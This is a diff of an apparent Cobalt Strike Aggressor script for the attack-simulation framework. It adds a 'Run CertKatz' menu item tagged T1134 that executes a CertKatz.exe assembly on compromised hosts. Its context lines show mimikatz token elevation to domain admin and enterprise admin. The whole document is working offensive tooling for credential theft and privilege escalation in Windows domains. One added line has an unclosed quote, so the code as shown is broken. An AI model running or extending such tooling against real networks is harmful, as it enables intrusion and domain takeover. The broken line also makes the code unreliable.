@@ -178,6 +178,20 @@ item "Elevate to Specified Token  - T1134"{
               }, $bids => $1));
 		}
 }
+
+#################################################
+
+#   CertKatz
+
+#################################################
+#Run CertKatz
+item "Run CertKatz  - T1134"{
+	local('$bid');
+		foreach $bid ($1){
+			certkatz($bid);
+		}
+	}
+	
 #################################################
 
 #   Pass The Ticket
@@ -496,6 +510,16 @@ bmimikatz($1, "token::elevate /domainadmin");
 sub elevateEA{
 bmimikatz($1, "token::elevate /enterpriseadmin");
 
+}
+
+#################################################
+
+#   CertKatz
+
+#################################################
+#CertKatz
+sub certkatz{
+bexecute_assembly($1, script_resource('exe/CertKatz.exe));
 }
 
 #################################################
